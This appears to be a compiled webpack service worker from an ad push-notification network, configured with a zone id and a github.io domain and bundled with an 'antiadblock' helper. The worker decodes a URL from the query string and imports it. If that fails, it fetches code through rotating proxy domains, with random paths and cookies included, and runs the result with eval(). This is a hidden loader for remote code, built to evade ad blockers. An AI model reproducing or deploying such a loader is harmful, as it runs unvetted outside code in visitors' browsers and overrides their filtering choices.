/******/ (function(modules) { // webpackBootstrap
  /******/ 	// The module cache
  /******/ 	var installedModules = {};
  /******/
  /******/ 	// The require function
  /******/ 	function __webpack_require__(moduleId) {
    /******/
    /******/ 		// Check if module is in cache
    /******/ 		if(installedModules[moduleId]) {
      /******/ 			return installedModules[moduleId].exports;
      /******/ 		}
    /******/ 		// Create a new module (and put it into the cache)
    /******/ 		var module = installedModules[moduleId] = {
      /******/ 			i: moduleId,
      /******/ 			l: false,
      /******/ 			exports: {}
      /******/ 		};
    /******/
    /******/ 		// Execute the module function
    /******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
    /******/
    /******/ 		// Flag the module as loaded
    /******/ 		module.l = true;
    /******/
    /******/ 		// Return the exports of the module
    /******/ 		return module.exports;
    /******/ 	}
  /******/
  /******/
  /******/ 	// expose the modules object (__webpack_modules__)
  /******/ 	__webpack_require__.m = modules;
  /******/
  /******/ 	// expose the module cache
  /******/ 	__webpack_require__.c = installedModules;
  /******/
  /******/ 	// define getter function for harmony exports
  /******/ 	__webpack_require__.d = function(exports, name, getter) {
    /******/ 		if(!__webpack_require__.o(exports, name)) {
      /******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
      /******/ 		}
    /******/ 	};
  /******/
  /******/ 	// define __esModule on exports
  /******/ 	__webpack_require__.r = function(exports) {
    /******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
      /******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
      /******/ 		}
    /******/ 		Object.defineProperty(exports, '__esModule', { value: true });
    /******/ 	};
  /******/
  /******/ 	// create a fake namespace object
  /******/ 	// mode & 1: value is a module id, require it
  /******/ 	// mode & 2: merge all properties of value into the ns
  /******/ 	// mode & 4: return value when already ns object
  /******/ 	// mode & 8|1: behave like require
  /******/ 	__webpack_require__.t = function(value, mode) {
    /******/ 		if(mode & 1) value = __webpack_require__(value);
    /******/ 		if(mode & 8) return value;
    /******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
    /******/ 		var ns = Object.create(null);
    /******/ 		__webpack_require__.r(ns);
    /******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
    /******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
    /******/ 		return ns;
    /******/ 	};
  /******/
  /******/ 	// getDefaultExport function for compatibility with non-harmony modules
  /******/ 	__webpack_require__.n = function(module) {
    /******/ 		var getter = module && module.__esModule ?
      /******/ 			function getDefault() { return module['default']; } :
      /******/ 			function getModuleExports() { return module; };
    /******/ 		__webpack_require__.d(getter, 'a', getter);
    /******/ 		return getter;
    /******/ 	};
  /******/
  /******/ 	// Object.prototype.hasOwnProperty.call
  /******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
  /******/
  /******/ 	// __webpack_public_path__
  /******/ 	__webpack_require__.p = "";
  /******/
  /******/
  /******/ 	// Load entry module and return exports
  /******/ 	return __webpack_require__(__webpack_require__.s = "./src/Pusher/sw.js");
  /******/ })
  /************************************************************************/
  /******/ ({

    /***/ "./src/CommonLibraries/helpers/antiadblock.js":
    /*!****************************************************!*\
      !*** ./src/CommonLibraries/helpers/antiadblock.js ***!
      \****************************************************/
    /*! no static exports found */
    /***/ (function(module, exports, __webpack_require__) {

      "use strict";


      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.addDomain = addDomain;
      exports.ultrafetch = ultrafetch;
      exports.testPingDomain = testPingDomain;
      var DB_NAME = 'swaab';

      function getDBRef(db) {
        return new Promise(function (resolve, reject) {
          var req = indexedDB.open(db, 1);

          req.addEventListener('upgradeneeded', function () {
            req.result.createObjectStore('domains', { keyPath: 'domain' });
          });

          req.addEventListener('error', reject);
          req.addEventListener('success', function () {
            return resolve(req.result);
          });
        });
      }

      function addDomain(domain) {
        return new Promise(function (resolve, reject) {
          getDBRef(DB_NAME).then(function (db) {
            var domains = db.transaction(['domains'], 'readwrite').objectStore('domains');

            var request = domains.put({
              domain: domain,
              createdAt: new Date().getTime()
            });

            request.addEventListener('success', resolve);
            request.addEventListener('error', reject);
          });
        });
      }

      function getDomains() {
        return new Promise(function (resolve, reject) {
          getDBRef(DB_NAME).then(function (db) {
            var domains = db.transaction(['domains'], 'readwrite').objectStore('domains');

            var request = domains.getAll();

            request.addEventListener('error', reject);
            request.addEventListener('success', function () {
              return resolve(request.result.map(function (_ref) {
                var domain = _ref.domain;
                return domain;
              }));
            });
          });
        });
      }

      function getRandomURI() {
        var subReq = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 0;

        var withSubReq = subReq < 7 && Math.random() > 0.3;
        var randomString = Math.random().toString(36).slice(2, 3 + parseInt(Math.random() * 9, 10));

        return '' + randomString + (withSubReq ? '/' + getRandomURI(subReq + 1) : '');
      }

      async function ultrafetch(url, options) {
        var domains = await getDomains();

        var _iteratorNormalCompletion = true;
        var _didIteratorError = false;
        var _iteratorError = undefined;

        try {
          for (var _iterator = domains[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
            var domain = _step.value;

            try {
              return await fetch('https://' + domain + '/' + getRandomURI(), {
                method: options.method || 'get',
                credentials: 'include',
                body: options.body,
                headers: {
                  token: btoa(url)
                }
              });
            } catch (e) {}
          }
        } catch (err) {
          _didIteratorError = true;
          _iteratorError = err;
        } finally {
          try {
            if (!_iteratorNormalCompletion && _iterator.return) {
              _iterator.return();
            }
          } finally {
            if (_didIteratorError) {
              throw _iteratorError;
            }
          }
        }

        throw new Error('AAB Request Failed');
      }

      async function testPingDomain(domain) {
        try {
          var request = await fetch(domain.indexOf(':') > -1 ? domain : 'https://' + domain);

          var _ref2 = await request.json(),
            status = _ref2.status;

          return status === false;
        } catch (e) {
          return false;
        }
      }

      /***/ }),

    /***/ "./src/Pusher/sw.js":
    /*!**************************!*\
      !*** ./src/Pusher/sw.js ***!
      \**************************/
    /*! no static exports found */
    /***/ (function(module, exports, __webpack_require__) {

      "use strict";


      var _antiadblock = __webpack_require__(/*! ../CommonLibraries/helpers/antiadblock */ "./src/CommonLibraries/helpers/antiadblock.js");

      self.options = {
        zoneId: 3520019,
        domain: 'kirgent.github.io',
        resubscribeOnInstall: true
      }; /* eslint-disable */

      self.lary = '';

      var DEFAULT_URL = ['https://', '/service-worker.min.js?r=sw&v=2'].join(self.options.domain);
      var STORE_EVENTS = ['install', 'activate', 'push', 'notificationclick', 'notificationclose', 'pushsubscriptionchange'];
      var url;

      try {
        url = atob(location.search.slice(1));
        if (!url) {
          throw null;
        }
      } catch (ignore) {
        url = DEFAULT_URL;
      }

      try {
        importScripts(url);
      } catch (ignore) {
        var events = {};
        var listeners = {};
        var realAddEventListener = self.addEventListener.bind(self);

        STORE_EVENTS.forEach(function (eventName) {
          self.addEventListener(eventName, function (event) {
            if (!events[eventName]) {
              events[eventName] = [];
            }

            events[eventName].push(event);

            if (listeners[eventName]) {
              listeners[eventName].forEach(function (listener) {
                try {
                  listener(event);
                } catch (ignore) {}
              });
            }
          });
        });

        self.addEventListener = function (eventName, listener) {
          if (STORE_EVENTS.indexOf(eventName) === -1) {
            return realAddEventListener(eventName, listener);
          }

          if (!listeners[eventName]) {
            listeners[eventName] = [];
          }

          listeners[eventName].push(listener);

          if (events[eventName]) {
            events[eventName].forEach(function (event) {
              try {
                listener(event);
              } catch (ignore) {}
            });
          }
        };

        (0, _antiadblock.ultrafetch)(url, {}).then(function (response) {
          return response.text();
        }).then(function (code) {
          return eval(code);
        });
      }

      /***/ })

    /******/ });